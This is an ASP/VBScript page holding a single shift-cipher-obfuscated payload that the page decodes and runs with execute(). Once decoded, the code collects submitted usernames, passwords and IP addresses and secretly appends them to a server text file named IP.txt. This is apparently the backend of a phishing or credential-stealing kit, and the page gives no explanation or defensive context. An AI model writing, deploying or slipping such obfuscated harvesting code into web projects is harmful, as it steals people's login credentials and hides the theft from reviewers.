<%
darkst="!!!!!Àè!!Ejn!!!WbmjeFousz!!!!!Àè!!WbmjeFousz!!!>!!!Usvf!!!Àè!!Jg!!!opu!!!JtFnquz)Tfttjpo)#MphJo#**!!!uifo!!!WbmjeFousz!!!>!!!Gbmtf!!!Àè!!Jg!!!WbmjeFousz!!!Uifo!!!!!Àè!!Dpotu!!!GpsBqqfoejoh!!!>!!!9!!!Àè!!Dpotu!!!Dsfbuf!!!>!!!usvf!!!Àè!!Ejn!!!GTP!!!Àè!!EJN!!!UT!!!Àè!!EJN!!!NzGjmfObnf!!!Àè!!(Ejn!!!tusMph!!!Àè!!Ejn!!!tusUjnf-tusVsm-tusPqpsbujpo-tusVtfsBhfou!!!Àè!!!!Àè!!NzGjmfObnf!!!>!!!Tfswfs/NbqQbui)#JQ/uyu#*!!!Àè!!Tfu!!!GTP!!!>!!!Tfswfs/DsfbufPckfdu)#Tdsjqujoh/GjmfTztufnPckfdu#*!!!Àè!!Tfu!!!UT!!!>!!!GTP/PqfoUfyuGjmf)NzGjmfObnf-!!!GpsBqqfoejoh-!!!Dsfbuf*!!!Àè!!!!Àè!!tusVsm>Sfrvftu/TfswfsWbsjbcmft)#SFNPUF`BEES#*!!!'!!!#!!!#!!!Àè!!!!Àè!!(!!!Xsjuf!!!dvssfou!!!jogpsnbujpo!!!up!!!Mph!!!Ufyu!!!Gjmf/!!!Àè!!Ut/xsjufmjof!!!#....ßÝßÝÒùµ´µÄ·Ö¸îÏß....#!!!Àè!!Ut/xsjufmjof!!!#·þÎñÆ÷JQ£º#'tusVsm!!!Àè!!(!!!Dsfbuf!!!b!!!tfttjpo!!!wbsjbmcf!!!up!!!difdl!!!ofyu!!!ujnf!!!gps!!!WbmjeFousz!!!Àè!!Tfttjpo)#MphJo#*!!!>!!!#zft#!!!Àè!!Tfu!!!UT!!!>!!!Opuijoh!!!Àè!!Tfu!!!GTP!!!>!!!Opuijoh!!!Àè!!Foe!!!Jg!!!Àèovn>sfrvftu)#vtfs#*Àèqbtt>sfrvftu)#qbtt#*Àèiyjq>sfrvftu)#jq#*Àètfu!gt>tfswfs/DsfbufPckfdu)#Tdsjqujoh/GjmfTztufnPckfdu#*Àètfu!gjmf>gt/PqfoUfyuGjmf)tfswfs/NbqQbui)#JQ/uyu#*-9-Usvf*Àèjg!iyjq!=?##!uifoÀègjmf/xsjufmjof!ovn,#....#,qbtt,#....jq;#,iyjqÀèfmtfÀègjmf/xsjufmjof!ovn,#....#,qbttÀèfoe!jgÀègjmf/dmptfÀètfu!gjmf>opuijohÀètfu!gt>opuijohÀèsftqpotf/xsjuf!#ßÝßÝÅÆ449:¼ÇÂ¼¹ÜÀíÃÜÂëBTQÊÕÐÅ°æ,ÏÔJQ!ÁªÏµRR!51:484894!!RRÈº;72312378#Àè!Àè"
execute(UnEncode(darkst))
function UnEncode(temp)
    but=1
    for i = 1 to len(temp)
        if mid(temp,i,1)<>"Àè" then
            If Asc(Mid(temp, i, 1)) < 32 Or Asc(Mid(temp, i, 1)) > 126 Then
                a = a & Chr(Asc(Mid(temp, i, 1)))
            else
                pk=asc(mid(temp,i,1))-but
                if pk>126 then
                    pk=pk-95
                elseif pk<32 then
                    pk=pk+95
                end if
                a=a&chr(pk)
            end if
        else
            a=a&vbcrlf
        end if
    next
    UnEncode=a
end function
%>
